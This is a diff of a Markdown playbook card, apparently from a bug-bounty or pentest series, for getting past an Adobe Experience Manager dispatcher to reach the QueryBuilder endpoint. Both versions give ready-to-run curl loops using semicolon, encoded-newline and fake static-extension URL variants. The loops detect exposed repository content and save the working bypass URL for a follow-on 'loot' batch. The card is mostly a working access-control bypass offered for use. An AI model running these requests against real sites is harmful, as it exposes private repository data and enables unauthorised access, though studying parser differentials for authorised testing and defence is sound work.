@@ -1,86 +1,90 @@
-# Batch 04 — Dispatcher bypass: semicolon + fake extension
+# Batch 04 — Trick the bouncer (fake file type)
 
-## objective
+## GOAL
+Reach QueryBuilder by making the URL look like a **css/js/png** file.
 
-Make the dispatcher think the request is a **static file** (css/js/png/…) while Sling still runs **QueryBuilder**.  
-Only this family of tricks — no GraphQL, no `form` selector yet.
+## TIME
+~1 hour
 
-## estimated_time
+## YOU NEED
+- Batch 03 said the plain door is locked
 
-60–90 minutes
+---
 
-## prerequisites
+## WHY (30 seconds)
 
-- Batch 03 showed QueryBuilder blocked (or you want a second access path)
-- Baseline: plain `/bin/querybuilder.json` status recorded
+**Bouncer (dispatcher)** = security guard that only reads the URL in a dumb way.  
+**AEM (Sling)** = the real app that reads the URL in a smarter way.
 
-## testing_workflow
+If you put a `;` and a fake `.css` in the URL:
 
-### 1) Baseline (30 seconds)
+- Guard thinks: “static CSS file, OK”  
+- App thinks: “QueryBuilder please”
+
+That mismatch is the whole game.  
+This card = **only** the semicolon / fake-extension family.
+
+---
+
+## DO THIS
 
 ```bash
-T="https://TARGET"
+T="https://PUT-THE-SITE-HERE"
+```
+
+### 1) Prove door still locked
+
+```bash
 curl -sk -o /dev/null -w "direct:%{http_code}\n" \
   "$T/bin/querybuilder.json?path=/content&p.limit=1"
 ```
 
-### 2) Technique A — path parameter + allowed extension
+### 2) Try fake extensions (main trick)
 
 ```bash
-# Dispatcher often ignores ';' parsing the way Sling does
-for ext in css js png jpg html pdf woff2 svg; do
+for ext in css js png jpg html pdf; do
   u="/bin/querybuilder.json;x='a/b.${ext}/c'?path=/content&p.limit=3"
   code=$(curl -sk -o /tmp/qb.out -w "%{http_code}" "$T$u")
-  size=$(wc -c </tmp/qb.out)
-  echo "$code $size  $u"
-  grep -qE 'hits|success|jcr:' /tmp/qb.out && echo "  >> LOOKS OPEN" && head -c 200 /tmp/qb.out && echo
+  bytes=$(wc -c </tmp/qb.out)
+  echo "$code $bytes  $u"
+  grep -qE 'hits|success|jcr:' /tmp/qb.out && echo ">>> OPEN" && head -c 200 /tmp/qb.out && echo
 done
 ```
 
-### 3) Technique B — classic noise variants (same idea)
+### 3) Extra shapes (same idea)
 
 ```bash
 for u in \
   "/bin/querybuilder.json;%0aa.css?path=/content&p.limit=3" \
   "/bin/querybuilder.json.css?path=/content&p.limit=3" \
-  "/bin/querybuilder.json/a.css?path=/content&p.limit=3" \
-  "/bin/querybuilder.json;.css?path=/content&p.limit=3"
+  "/bin/querybuilder.json/a.css?path=/content&p.limit=3"
 do
   code=$(curl -sk -o /tmp/qb.out -w "%{http_code}" "$T$u")
-  size=$(wc -c </tmp/qb.out)
-  echo "$code $size  $u"
+  echo "$code  $u"
   grep -qE 'hits|success' /tmp/qb.out && head -c 200 /tmp/qb.out && echo
 done
 ```
 
-### 4) Technique C — reuse winner on another path
+### 4) If one works — save it
 
 ```bash
-# Example if css semicolon worked:
-QB="$T/bin/querybuilder.json;x='a/b.css/c'"
-curl -sk -G "$QB" --data-urlencode "path=/etc" --data-urlencode "p.limit=3" | head -c 400; echo
+# example if css worked:
+export QB="$T/bin/querybuilder.json;x='a/b.css/c'"
+echo "QB=$QB"
 ```
 
-Save:
+---
 
-```text
-WORKING_BYPASS=...
-```
+## IF / THEN
 
-## decision_points
+| What you saw | What you do |
+|--------------|-------------|
+| `>>> OPEN` or `"hits"` | Save `QB` → go **07** |
+| All fail | Go **NEXT** (05) |
+| Lots of 403 | Slow down. Still go 05 |
 
-| If… | Then… |
-|-----|--------|
-| Any variant returns QueryBuilder JSON | Set `QB=...` → go **07** (or finish timer then 07) |
-| All fail | Continue **05** (different bypass family) |
-| WAF 403 on `;` | Try GraphQL hybrid in **05**; reduce rate |
+---
 
-## expected_findings
-
-- Dispatcher parse differential (reportable when chained to data access)
-- Stable `QB` URL for loot batches
-
-## next_batch_to_continue_with
-
-- Success → **[07-loot-querybuilder.md](./07-loot-querybuilder.md)**  
-- Failure → **[05-bypass-graphql.md](./05-bypass-graphql.md)**
+## NEXT
+- Win → [07-loot-querybuilder.md](./07-loot-querybuilder.md)  
+- Fail → [05-bypass-graphql.md](./05-bypass-graphql.md)
